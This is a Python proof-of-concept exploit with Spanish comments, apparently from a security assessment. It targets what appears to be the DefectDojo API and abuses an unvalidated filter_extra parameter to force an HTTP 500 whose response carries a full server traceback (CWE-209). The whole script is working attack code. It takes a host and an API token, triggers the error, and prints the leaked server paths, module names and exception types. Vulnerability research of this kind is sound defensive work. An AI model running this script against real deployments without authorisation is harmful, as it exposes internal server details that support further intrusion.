"""
A10:2025 — Vuln 1: Traceback completo en respuesta de error (CWE-209)

El exception handler global de la API (dojo/api_v2/exception_handler.py)
incluye traceback.format_exc() en el campo "detail" de cualquier respuesta
HTTP 500. Cualquier endpoint que cause un error interno no manejado expone
rutas absolutas del servidor, nombres de modulos y numeros de linea exactos.

Uso:
    python A10_V1.py --host http://<HOST> --token <API_TOKEN>
"""

import argparse
import json
import urllib.error
import urllib.request


def trigger_500(host: str, token: str) -> tuple[int, dict]:
    # filter_extra pasa el valor directamente a queryset.filter(**{valor: True})
    # Si el campo no existe, Django lanza FieldError de inmediato (no lazy)
    # FieldError no es APIException → llega al exception handler → traceback expuesto
    url = f"{host.rstrip('/')}/api/v2/findings/?filter_extra=INVALID_FIELD_TRIGGER"
    req = urllib.request.Request(
        url,
        headers={"Authorization": f"Token {token}"},
        method="GET",
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def exploit(host: str, token: str) -> None:
    print("\n" + "=" * 60)
    print("VULN A10-1 — CWE-209: Traceback en respuesta de error")
    print("=" * 60)

    print(f"\n[1] Enviando peticion que genera error 500 interno...")
    code, data = trigger_500(host, token)
    print(f"    HTTP {code}")

    if "detail" not in data or "Traceback" not in str(data.get("detail", "")):
        print("\n[!] No se recibio traceback en 'detail'. Respuesta:")
        print(f"    {json.dumps(data, indent=2)}")
        return

    error_text = data["detail"]
    print("\n[2] Traceback recibido en la respuesta (informacion expuesta):")
    print("-" * 60)
    print(error_text.rstrip())
    print("-" * 60)

    lines = error_text.splitlines()
    paths = [l.strip() for l in lines if l.strip().startswith("File ")]
    errors = [l for l in lines if "Error" in l or "Exception" in l]

    print("\n[3] Resumen de la informacion filtrada:")
    if paths:
        print("    Rutas del servidor:")
        for p in paths:
            print(f"      {p}")
    if errors:
        print("    Tipo de error expuesto:")
        for e in errors[:3]:
            print(f"      {e.strip()}")
    print()
    print("    Cualquier endpoint que cause un 500 expone esta informacion.")
    print("    No requiere payload especial — basta con un ID invalido.")
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit A10 Vuln 1 — CWE-209: Traceback en respuesta"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    parser.add_argument("--token", required=True, help="API token del usuario")
    args = parser.parse_args()

    exploit(args.host, args.token)
